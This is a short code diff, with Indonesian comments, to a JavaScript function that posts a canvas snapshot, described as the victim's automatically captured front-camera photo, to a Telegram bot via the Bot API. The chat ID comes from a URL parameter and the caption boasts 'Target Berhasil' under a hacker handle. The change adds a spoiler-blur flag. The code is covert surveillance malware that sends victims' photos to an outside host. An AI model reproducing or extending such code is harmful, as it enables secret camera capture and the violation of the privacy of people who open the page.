@@ -114,13 +114,15 @@
     }
 
     // Fungsi pengiriman bypass langsung menembak Telegram API (Menggunakan BLOB)
-    // Ditargetkan langsung ke ID pengguna yang tertera di parameter URL (?sender=)
     function sendDirectTelegram(chatIdToSend) {
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
-            formData.append('chat_id', chatIdToSend); // Mengirim ke ID dinamis, bukan statis admin!
+            formData.append('chat_id', chatIdToSend); 
             formData.append('photo', blob, 'snapshot.png');
             formData.append('caption', '📸 Target Berhasil\nFoto kamera depan target berhasil diambil otomatis by @ANOYMOUSQZ☠️.');
+            
+            // 🌟 MENAMBAHKAN FITUR SENSOR BLUR OTOMATIS (SPOILER)
+            formData.append('has_spoiler', 'true'); 
 
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
